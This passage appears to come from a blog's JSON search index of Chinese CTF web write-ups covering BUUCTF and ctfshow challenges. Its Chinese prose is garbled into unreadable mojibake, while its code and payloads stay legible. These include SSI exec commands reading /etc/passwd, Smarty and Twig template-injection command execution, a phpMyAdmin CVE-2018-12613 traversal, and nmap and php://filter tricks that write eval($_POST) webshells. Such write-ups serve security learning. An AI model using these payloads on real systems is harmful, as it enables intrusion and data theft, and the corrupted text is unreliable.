file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;! #include virtual=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;fileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„ ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº&lt;#exec&gt; 12&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;â€“&gt; ssiæ¢æµ‹å¦‚æœåœ¨ç½‘ç«™ç›®å½•ä¸­å‘ç°äº†.stmï¼Œ.shtmï¼Œ.shtmlï¼Œå¹¶ä¸”ç½‘ç«™å¯¹äºssiçš„è¾“å…¥æ²¡æœ‰åšåˆ°ä¸¥æ ¼è¿‡æ»¤ï¼Œå¾ˆæœ‰å¯èƒ½è¢«ssiæ³¨å…¥æ”»å‡»ã€‚è¿™æ—¶è·å–ä¿¡æ¯ä¸€èˆ¬è¦ä¼šç”¨åˆ°nmapä»¥åŠdirbã€‚ è¿˜å¯ä»¥ä»ä¸šåŠ¡åœºæ™¯æ¥åˆ¤æ–­ï¼Œå¦‚æœæœ‰è·å–IPã€å®šä½ã€æ—¶é—´ç­‰ç­‰éƒ½å¯èƒ½æ˜¯ç”¨ssiå®ç°çš„ï¼Œè¿™æ—¶å¯èƒ½ä¼šå­˜åœ¨ssiæ³¨å…¥ã€‚ æ€»ç»“å…¶å®è¿™ç¯‡åšå®¢æŒºæ°´çš„ï¼Œå› ä¸ºæœ¬æ¥ssiä¹ŸåŸºæœ¬å¾ˆå°‘è€ƒåˆ°ï¼Œå› æ­¤å°±è¿ç€nmapä¹Ÿä¸€èµ·å†™äº†ã€‚æ˜å¤©è€ƒæ ¸åŠ æ²¹ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -nmap -ssi","slug":"web-nmap-ssi","permalink":"http://example.com/tags/web-nmap-ssi/"}]},{"title":"buuç»ƒä¹ 3","slug":"buuç»ƒä¹ 3","date":"2022-02-24T09:47:55.000Z","updated":"2022-02-24T13:16:22.112Z","comments":true,"path":"2022/02/24/buuç»ƒä¹ 3/","link":"","permalink":"http://example.com/2022/02/24/buu%E7%BB%83%E4%B9%A03/","excerpt":"å‰è¨€ è™½ç„¶è¦è€ƒæ ¸äº†ï¼Œä½†æ˜¯è¿˜æ˜¯è¦å‡†å¤‡æ¥ä¸‹æ¥çš„æ¯”èµ›ï¼Œè€Œä¸”ä¸æ˜¯å¾ˆæƒ³çœ‹ååºåˆ—åŒ–ï¼Œæ‰€ä»¥å°±ç»§ç»­åˆ·é¢˜æ‹“å®½çŸ¥è¯†é¢äº†ã€‚","text":"å‰è¨€ è™½ç„¶è¦è€ƒæ ¸äº†ï¼Œä½†æ˜¯è¿˜æ˜¯è¦å‡†å¤‡æ¥ä¸‹æ¥çš„æ¯”èµ›ï¼Œè€Œä¸”ä¸æ˜¯å¾ˆæƒ³çœ‹ååºåˆ—åŒ–ï¼Œæ‰€ä»¥å°±ç»§ç»­åˆ·é¢˜æ‹“å®½çŸ¥è¯†é¢äº†ã€‚ [BJDCTF2020]Mark loves catè¿›å…¥ç½‘é¡µæ²¡æœ‰ä»€ä¹ˆèƒ½æ³¨å…¥çš„åœ°æ–¹ï¼Œæ€€ç–‘ä¿¡æ¯æœé›†ï¼Œæ‰«æç›®å½•å‘ç°å­˜åœ¨gitæºç æ³„éœ²ï¼Œç”¨GitHackæå–ï¼ŒæŸ¥çœ‹æºç ï¼šflag.phpï¼š 12&lt;?php$flag = file_get_contents(&#x27;/flag&#x27;); index.phpï¼š 123456789101112131415161718192021222324252627282930&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125;echo &quot;the flag is: &quot;.$flag; åˆ†ææºç ï¼Œé¦–å…ˆçœ‹åˆ°foreach()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯éå†æ•°ç»„ï¼š foreach (iterable_expression as $key =&gt; $value) statementéå†ç»™å®šçš„ iterable_expression è¿­ä»£å™¨ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„é”®åè¢«èµ‹ç»™å˜é‡ $keyï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ $valueã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥æ”¹å˜å®šä¹‰çš„ä¸‰ä¸ªå˜é‡çš„å€¼ï¼Œç„¶åæ„å»ºexit($flag)è¯»å–flagï¼Œæˆ–è€…æˆ‘ä»¬ç»•è¿‡æ‰€æœ‰çš„åˆ¤æ–­è¯­å¥å¹¶ä¸”ä¸æ”¹å˜flagçš„å€¼ä¹Ÿå¯ä»¥è¯»å–åˆ°flagã€‚ å› æ­¤è¿™é‡Œå°±è¦ç”¨åˆ°å˜é‡è¦†ç›–çš„åŸç†äº†ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºæœ€åpayloadå¹¶è¿›è¡Œåˆ†æã€‚ payload1ï¼š 1?yds=flag é¦–å…ˆæˆ‘ä»¬æ²¡æœ‰GETè¿›flagï¼Œå› æ­¤ç»•è¿‡äº†ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æ²¡æœ‰ä¼ å…¥flagï¼Œå› æ­¤è¦æ‰§è¡Œç¬¬äºŒä¸ªåˆ¤æ–­ä¸­çš„è¯­å¥ï¼Œè¿”å›$ydsã€‚ä½†æ˜¯æˆ‘ä»¬GETä¼ å…¥æ ¹æ®ä¼šæ‰§è¡Œ$$x = $$yï¼Œå³$yds=$flagã€‚è€Œ$flagçš„å€¼æ²¡æœ‰æ”¹å˜ï¼Œå› æ­¤å¯ä»¥å¾—åˆ°flagã€‚ payload2ï¼š 1?is=flag&amp;flag=flag GETä¼ å…¥flag=flagï¼Œè¿™æ ·å°±æ²¡æœ‰æ”¹å˜flagçš„å€¼ï¼Œè€Œä¸”ä¼šè§¦å‘ç¬¬ä¸‰ä¸ªåˆ¤æ–­è¯­å¥ï¼Œè¿”å›$isï¼Œå› æ­¤å†æŠŠ$isèµ‹å€¼flagå°±å¯ä»¥äº†ã€‚ [BJDCTF2020]EasySearchä¸Šæ¥å°±æ˜¯ç™»å½•æ¡†ï¼Œæ ¹æ®é¢˜ç›®çŒœæƒ³å«æœ‰ä¿¡æ¯æœé›†ï¼Œæµ‹è¯•å‘ç°å­˜åœ¨index.php.swpï¼Œè¿›å…¥æŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; æˆ‘ä»¬å¾—çŸ¥æˆ‘ä»¬è¾“å…¥çš„passwordè¿›è¡Œmd5åŠ å¯†åçš„å‰6ä½åº”è¯¥ä¸º6d0bc1ï¼Œå†™pythonè„šæœ¬çˆ†ç ´ï¼š 12345678import hashlibfor i in range(1000000000): a = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest() if a[0:6] == &#x27;6d0bc1&#x27;: print(i) print(a) è¿›å…¥åå‘ç°è¯·æ±‚å¤´ä¸­è—è¿™ä¸ªurlï¼Œè®¿é—®åè¿›å…¥æ–°é¡µé¢ï¼š 1public/fdf1c9d4a791f1e565a71524bfffac7b4875a60e.shtml æœç´¢èµ„æ–™åå‘ç°è¿™é‡Œè¦ç”¨åˆ°ssiï¼Œå› æ­¤åœ¨usernameé‚£é‡Œå†™å…¥payloadï¼š 12&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt; è·å–flagã€‚ç»§ç»­æŒ–å‘ï¼Œssiçš„åšå®¢ä¹‹åä¼šå†™çš„ã€‚ [CISCN2019 åä¸œå—èµ›åŒº]Web11çœ‹é¡µé¢æœ€åå‘Šè¯‰æˆ‘ä»¬Build With Smarty !ï¼Œä¸éš¾çŒœå‡ºæ˜¯ä¸€é“sstiã€‚ä½†æ˜¯è¿™ä¸ªæ³¨å…¥ç‚¹çœ‹äº†å¥½ä¹…æ‰çœ‹å‡ºæ¥ï¼Œæ ¹æ®ç½‘é¡µä¸Šget IPï¼Œget XFFï¼Œæç¤ºæ³¨å…¥ç‚¹åœ¨å¤´æ–‡ä»¶ä¸­çš„XFFä¸­ã€‚ è€ŒSmarty sstiçš„æ³¨å…¥å¯ä»¥ç”¨&#123;&#125;ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ ‡ç­¾ã€‚æˆ‘è¿™é‡Œä½¿ç”¨æ ‡ç­¾æ„å»ºpayloadï¼š 12X-Forwarded-For: &#123;if system(&#x27;ls ../../../&#x27;)&#125;&#123;/if&#125;X-Forwarded-For: &#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“è¿›ç½‘é¡µå•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰«ç›®å½•å‘ç°/phpmyadminï¼Œè¿›å…¥åå‘ç°æ˜¯æ•°æ®åº“åå°ã€‚ å‘ç°phpmyadminç‰ˆæœ¬ä¸º4.8.1ï¼Œæœå¯»åå‘ç°CVE-2018-12613æ¼æ´ï¼Œç›´æ¥ç”¨è¿™ä¸ªæ¼æ´æ„é€ payloadå°±å¯ä»¥äº†ï¼š 1http://3ffc4981-eb9f-463d-84e3-ef1348d3b690.node4.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag [BUUCTF 2018]Online Toolå®¡è®¡æºç ï¼š 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; è¿™é¢˜çš„å…³é”®æ˜¯åˆ©ç”¨æœ€åä¸€å¥ä»£ç ï¼Œç”¨nmapå†™å…¥shellï¼Œpayloadï¼š 1?host=&#x27;&lt;?php @eval($_POST[&quot;mrl64&quot;]);?&gt; -oG 1.php &#x27; èšå‰‘è¿æ¥å³å¯ã€‚ ä½†æ˜¯è¿™é¢˜çš„payloadæ„å»ºçš„æ ¸å¿ƒåœ¨äºè¿™ä¸ªå¼•å·ä¸Šï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªå¼•å·è¦è¿™æ ·æ„å»ºå‘¢ï¼Œä¸»è¦é—®é¢˜å‡ºåœ¨escapeshellarg()ä¸escapeshellcmd()è¿™ä¸¤ä¸ªå‡½æ•°ä¸Šã€‚ escapeshellarg()çš„ä½œç”¨å°±æ˜¯å°†å•å¼•å·è½¬ä¹‰ï¼Œå¹¶å°†è½¬ä¹‰åçš„å•å¼•å·çš„å‰åä¸¤éƒ¨åˆ†å†ç”¨ä¸€ä¸ªå•å¼•å·æ‹¬ä¸Šä¾‹å¦‚ï¼š123â€™ ls â€”&gt; â€˜123â€™&#39;â€˜ lsâ€™ escapeshellcmd()çš„ä½œç”¨å°±å¾ˆç®€å•äº†ï¼Œåœ¨&amp;#;`|*?~&lt;&gt;^()[]{}$ \\x0A å’Œ \\xFFå’Œæ²¡æœ‰é…å¯¹çš„å•å¼•å·å‰æ’å…¥â€â€ä¾‹å¦‚ï¼šâ€™123â€™&#39;â€˜ lsâ€™ â€”&gt; â€˜123â€™\\â€˜â€™ ls&#39; å› æ­¤æˆ‘ä»¬æŒ‰payloadä¼ å…¥çš„è¯ï¼Œè¯­å¥å˜æˆï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php @eval\\($_POST\\[&quot;mrl64&quot;\\]\\)\\;\\?\\&gt; -oG 1.php &#x27;&#x27; å¦‚æœæœ€åçš„å¼•å·å‰æ²¡åŠ ç©ºæ ¼çš„è¯ï¼Œpayloadå°±ä¼šè¢«è½¬ä¹‰æˆï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php @eval\\($_POST\\[&quot;mrl64&quot;\\]\\)\\;\\?\\&gt; -oG 1.php&#x27;\\\\&#x27;&#x27;&#x27; æ–‡ä»¶åä¼šå˜æˆ1.php\\\\ å¦‚æœå¼•å·æ²¡åŠ çš„è¯ï¼Œpayloadè¢«è½¬ä¹‰æˆï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php @eval\\($_POST\\[&quot;mrl64&quot;\\]\\)\\;\\?\\&gt; -oG 1.php\\&#x27; æ–‡ä»¶åå˜æˆ1.php&#39; [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmapè¿™é¢˜å’Œä¸Šé¢˜åŸç†æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä½†æ˜¯è¿‡æ»¤äº†phpï¼Œå› æ­¤ç”¨çŸ­æ ‡ç­¾ç»•è¿‡æ ‡ç­¾phpï¼Œç”¨phtmlç»•è¿‡æ–‡ä»¶åç¼€åï¼š 1&#x27;&lt;?= @eval($_POST[&quot;mrl64&quot;]);?&gt; -oG 1.phtml &#x27; èšå‰‘è¿æ¥å³å¯ã€‚ [BJDCTF2020]Cookie is so stableæ ¹æ®æç¤ºï¼Œæˆ‘ä»¬æŠ“åŒ…è§‚å¯Ÿcookieï¼Œå‘ç°æœ€åé¡µé¢ä¼šå›æ˜¾çš„å†…å®¹ä¸cookieä¸­çš„useræœ‰å…³ï¼Œè¿›è¡Œæµ‹è¯•ç¡®è®¤æ˜¯twigçš„sstiã€‚ ç›´æ¥æ„å»ºtwigçš„rceç›¸å…³payloadï¼š 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat ../../../../flag&quot;)&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"ã€ctfshowæ¬¢ä¹æ–°æ˜¥èµ›ã€‘write up","slug":"ã€ctfshowæ¬¢ä¹æ–°æ˜¥èµ›ã€‘write-up","date":"2022-02-22T12:53:29.000Z","updated":"2022-03-02T14:08:54.586Z","comments":true,"path":"2022/02/22/ã€ctfshowæ¬¢ä¹æ–°æ˜¥èµ›ã€‘write-up/","link":"","permalink":"http://example.com/2022/02/22/%E3%80%90ctfshow%E6%AC%A2%E4%B9%90%E6%96%B0%E6%98%A5%E8%B5%9B%E3%80%91write-up/","excerpt":"å‰è¨€ è¿‡å¹´çš„æ—¶å€™åœ¨æ‰“hgameï¼Œçœ‹äº†ä¸‹è¿™ä¸ªæ–°æ˜¥èµ›çš„é¢˜ç›®è¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œè¿™é‡Œè¡¥ä¸ªç¥¨ã€‚","text":"å‰è¨€ è¿‡å¹´çš„æ—¶å€™åœ¨æ‰“hgameï¼Œçœ‹äº†ä¸‹è¿™ä¸ªæ–°æ˜¥èµ›çš„é¢˜ç›®è¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œè¿™é‡Œè¡¥ä¸ªç¥¨ã€‚ çƒ­èº«æŸ¥çœ‹æºç ï¼š 1eval($_GET[&#x27;f&#x27;]); ç›¸å½“ç®€å•ç²—æš´ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç–‘ç‚¹ï¼Œæ²¡æœ‰highlight_file(__FILE__);ä»£ç ä½†æ˜¯å´æ˜¾ç¤ºäº†ä»£ç ï¼Œå› æ­¤æ€€ç–‘æœ‰åŒ…å«ï¼Œä¸è¿‡ç›´æ¥ä¸Šphpinfoå°±èƒ½æ‰¾åˆ°flagä½ç½®äº†ï¼š 12?f=phpinfo();?f=system(&#x27;tac /etc/ssh/secret/youneverknow/secret.php&#x27;); web1æŸ¥çœ‹æºç ï¼š 12345highlight_file(__FILE__);error_reporting(0);$content = $_GET[content];file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content); å¾ˆæ˜æ˜¾è¿™é‡Œè¦ç»•è¿‡è¿™ä¸ªæ­»äº¡exit()ï¼Œè¿™é‡Œè¦åˆ©ç”¨php://filterä¼ªåè®®å†™å…¥shellï¼Œpayloadå¦‚ä¸‹ï¼š 1?content=php://filter/write=string.rot13|&lt;?cuc @riny($_cbfg[&quot;zey64&quot;]);?&gt;/resource=shell.php ç„¶åèšå‰‘è¿æ¥å³å¯ã€‚ web2æŸ¥çœ‹æºç ï¼š 123456789101112highlight_file(__FILE__);session_start();error_reporting(0);include &quot;flag.php&quot;;if(count($_POST)===1)&#123; extract($_POST); if (call_user_func($$$$$$&#123;key($_POST)&#125;)===&quot;HappyNewYear&quot;)&#123; echo $flag; &#125;&#125; é¦–å…ˆå‡½æ•°å¼€å¯session()ï¼Œæ¥ç€å‘ç°æˆ‘ä»¬å¯ä»¥POSTä¼ å…¥ä¸€ä¸ªä¸œè¥¿è¿›å»ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¼ è¿›å»çš„ä¸œè¥¿ä¼šå…ˆæ‰§è¡Œextract()å‡½æ•°ï¼Œæœ€ååˆ¤æ–­call_user_func($$$$$$&#123;key($_POST)&#125;çš„å€¼æ˜¯å¦ä¸ºHappyNewYearã€‚ äº†è§£é€»è¾‘åï¼Œæˆ‘ä»¬å¼€å§‹æ„å»ºpayloadã€‚é¦–å…ˆæˆ‘ä»¬POSTä¼ å€¼ï¼š 1session_id=session_id è¿™æ ·è¿›è¡Œextract($_POST);æ—¶ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°$session_id=session_idè¿™ä¸ªç»“æœï¼Œè€Œ$&#123;key($_POST)&#125;è¡¨ç¤ºçš„å°±æ˜¯ä»¥æˆ‘ä»¬POSTçš„å˜é‡ååšä¸ºæ–°å˜é‡çš„å˜é‡åï¼Œè¿™æ ·å¥—ä¸ªå¨ƒå°±ä¼šå‘ç°ifä¸­çš„è¯­å¥å°±å˜æˆäº†call_user_func($session_id)===&quot;HappyNewYear&quot;ï¼Œå› æ­¤æˆ‘ä»¬æ›´æ”¹PHPSESSIDçš„å€¼å°±å¯ä»¥äº†ã€‚ å®Œæ•´payloadï¼š 12POST:session_id=session_idcookie:PHPSESSID=HappyNewYear web3æŸ¥çœ‹æºç ï¼š 1234567891011highlight_file(__FILE__);error_reporting(0);include &quot;flag.php&quot;;$key= call_user_func(($_GET[1]));if($key==&quot;HappyNewYear&quot;)&#123; echo $flag;&#125;die(&quot;è™å¹´å¤§å‰ï¼Œæ–°æ˜¥å¿«ä¹ï¼&quot;); è¿™é¢˜åˆšå¼€å§‹çœ‹ç€æ‡µæ‡µçš„ï¼Œä½†å…¶å®æƒ³æ¸…æ¥šåå°±æ„Ÿè§‰ä¸æ˜¯å¾ˆéš¾ã€‚æœ¬è´¨ä¸Šè¿™é¢˜è€ƒçš„å°±æ˜¯ä¸€ä¸ªå¼±ç±»å‹æ¯”è¾ƒï¼Œåªè¦$keyèƒ½å¤Ÿå¾—åˆ°ä¸€ä¸ªbool(true)å°±å¯ä»¥è§£å†³äº†ï¼Œå› æ­¤è¿™é¢˜è€ƒçš„å°±æ˜¯å¯¹å‡½æ•°çš„ç†Ÿæ‚‰ç¨‹åº¦äº†ã€‚ æ‰¾äº†å‡ ä¸ªpayloadï¼Œéƒ½å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 123?1=session_start?1=json_last_error?1=error_reporting web4æŸ¥çœ‹æºç ï¼š 1234567highlight_file(__FILE__);error_reporting(0);$key= call_user_func(($_GET[1]));file_put_contents($key, &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);die(&quot;è™å¹´å¤§å‰ï¼Œæ–°æ˜¥å¿«ä¹ï¼&quot;); è¿™é¢˜çœ‹ç€å°±æ›´éº»äº†ï¼Œçœ‹äº†wpæ‰æ‡‚ã€‚è¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ï¼šspl_autoload_extensions()ã€‚ spl_autoload_extensions(file_extensions) â€” æ³¨å†Œå¹¶è¿”å› spl_autoload å‡½æ•°ä½¿ç”¨çš„é»˜è®¤æ–‡ä»¶æ‰©å±•åfile_extensions:å½“ä¸ä½¿ç”¨ä»»ä½•å‚æ•°è°ƒç”¨æ­¤å‡½æ•°æ—¶ï¼Œå®ƒè¿”å›å½“å‰çš„æ–‡ä»¶æ‰©å±•åçš„åˆ—è¡¨ï¼Œä¸åŒçš„æ‰©å±•åç”¨é€—å·åˆ†éš”ã€‚è¦ä¿®æ”¹æ–‡ä»¶æ‰©å±•ååˆ—è¡¨ï¼Œç”¨ä¸€ä¸ªé€—å·åˆ†éš”çš„æ–°çš„æ‰©å±•ååˆ—è¡¨å­—ç¬¦ä¸²æ¥è°ƒç”¨æœ¬å‡½æ•°å³å¯ã€‚é»˜è®¤çš„ spl_autoload å‡½æ•°ä½¿ç”¨çš„æ‰©å±•åæ˜¯ â€œ.inc,.phpâ€ã€‚ å› æ­¤æˆ‘ä»¬GETä¼ å…¥è¿™ä¸ªå‡½æ•°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå†…å®¹ä¸ºä¸€å¥é©¬çš„ï¼Œåå­—å«.inc,.phpçš„shellæ–‡ä»¶ï¼Œä¹‹åå‘½ä»¤æ‰§è¡Œå³å¯ã€‚payloadï¼š 123456ç¬¬ä¸€æ­¥ï¼š?1=spl_autoload_extensionsç¬¬äºŒæ­¥ï¼š/.inc,.phpPOSTï¼š1=system(&#x27;ls ../../../&#x27;);1=system(&#x27;cat ../../../f1ag.txt&#x27;); web5æŸ¥çœ‹æºç ï¼š 12345678error_reporting(0);highlight_file(__FILE__);include &quot;ğŸ¯ğŸ¯.php&quot;;file_put_contents(&quot;ğŸ¯&quot;, $flag);$ğŸ¯ = str_replace(&quot;hu&quot;, &quot;ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯ğŸ¯&quot;, $_POST[&#x27;ğŸ¯&#x27;]);file_put_contents(&quot;ğŸ¯&quot;, $ğŸ¯); é€»è¾‘å°±æ˜¯å°†flagå†™å…¥æ–‡ä»¶ğŸ¯ä¸­ï¼Œä½†æ˜¯æœ€åä¼šæŠŠ$ğŸ¯çš„å†…å®¹å†™å…¥ï¼Œä»è€Œå¯¼è‡´flagè¢«è¦†ç›–ã€‚å› æ­¤æˆ‘ä»¬è¦åˆ©ç”¨str_replace()å‡½æ•°çš„ç‰¹æ€§ï¼Œä¸Šä¼ è¶…é•¿å­—ç¬¦ä¸²å¯¼è‡´æº¢å‡ºä»è€Œä½¿å¾—å‡ºç°è‡´å‘½é”™è¯¯å¯¼è‡´å˜é‡å‘½åå¤±è´¥ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æœ€åçš„å†™å…¥äº†ã€‚ æ ¹æ®è®¡ç®—ï¼Œéœ€è¦2097152ä¸ªhuæ‰èƒ½æº¢å‡ºï¼Œå› æ­¤ç”¨pythonç”Ÿæˆï¼š 12345678hu = &#x27;hu&#x27;flag = &#x27;&#x27;file_handle=open(&#x27;1.txt&#x27;,mode=&#x27;w&#x27;)for i in range(0,2097152): flag += hufile_handle.write(flag)file_handle.close()print(&#x27;ok&#x27;) ç”¨bpä¼ å€¼ï¼Œç„¶åä¸‹è½½æ–‡ä»¶å³å¯è·å–flagã€‚ web6æŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627error_reporting(0);highlight_file(__FILE__);$function = $_GET[&#x27;POST&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;ctfshow&#x27;,&#x27;daniu&#x27;,&#x27;happyhuyear&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST[&#x27;GET&#x27;]);$_SESSION[&#x27;file&#x27;] = base64_encode(&quot;/root/flag&quot;);$serialize_info = filter(serialize($_SESSION));if($function == &#x27;GET&#x27;)&#123; $userinfo = unserialize($serialize_info); //å‡ºé¢˜äººå·²ç»æ‹¿è¿‡flagï¼Œé¢˜ç›®æ­£å¸¸,ä¹Ÿå°±æ˜¯è¯´... echo file_get_contents(base64_decode($userinfo[&#x27;file&#x27;]));&#125; ååºåˆ—åŒ–ç›¸å…³çš„é¢˜çœŸçš„å¥½éš¾ã€‚å®¡è®¡æºç é¦–å…ˆæˆ‘ä»¬éœ€è¦$function=&#39;GET&#39;ï¼Œæ¥ç€è¦åˆ©ç”¨file_get_contentsè¯»å–æ–‡ä»¶ï¼Œçœ‹äº†wpåäº†è§£åˆ°åº”è¯¥è¦è¯»å–nginxæ—¥å¿—/var/log/nginx/access.logã€‚ è¿™é‡Œåº”ç”¨åˆ°ååºåˆ—åŒ–é€ƒé€¸è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œæ„å»ºpayloadï¼š 1GET[_SESSION][ctfshowdaniu]=s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125; è¿™ä¸ªpayloadæˆ‘å•ƒäº†å¥½ä¹…æ‰å•ƒæ‡‚ã€‚ extract($_POST[&#39;GET&#39;]);ï¼Œæˆ‘ä»¬éœ€è¦POSTä¸€ä¸ªæ•°ç»„GET[_SESSION][ctfshowdaniu]ï¼Œè¿™æ ·ä¼ è¿›å»å°±å¯ä»¥å¾—åˆ°$_SESSIONæ•°ç»„å˜é‡ï¼Œctfshowdaniuæ˜¯æ•°ç»„å˜é‡ä¸­çš„ä¸€ä¸ªé”®ã€‚ æ¥ç€è¦è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œå› æ­¤æˆ‘ä»¬è¦åˆ©ç”¨åˆ°filterå‡½æ•°ã€‚é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹SESSIONä¸€å¼€å§‹çš„åºåˆ—åŒ–å†…å®¹ï¼š 